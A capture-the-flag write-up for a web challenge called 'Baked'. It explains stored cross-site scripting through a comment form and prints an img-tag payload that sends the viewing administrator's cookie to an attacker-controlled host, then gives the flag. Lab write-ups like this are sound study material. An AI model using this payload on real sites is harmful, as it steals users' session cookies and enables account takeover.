# Baked

I have this new website and I have given users the ability to send me comments. Send me your thoughts on my new articles. I'll be checking the commends regularly.

**Note: Do NOT use automated/bruteforce tools on this challenge. There will be some delay before the admin reads your comment, so please be patient.**

## Solution

For this challenge, the goal is to exfiltrate the administrator cookie through Cross-Site Scripting, which is injecting HTML into the comment, which is then viewed by the administrator, leading to the HTML being viewed by the admin. Since the admin views the HTML and executes the JavaScript within it, we will be able to steal his cookie by sending it to a site we control. 

The following code is used to perform Cross-Site Scripting to exfiltrate the admin cookie:

```<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>```

We can then use a site we control (ex: webhook.site) as our server IP, and then we can see the response that is sent to our site. With this request, the response will contain the cookie as a response, which will have the flag:

flag:
`gigem{cr0553d_up}`
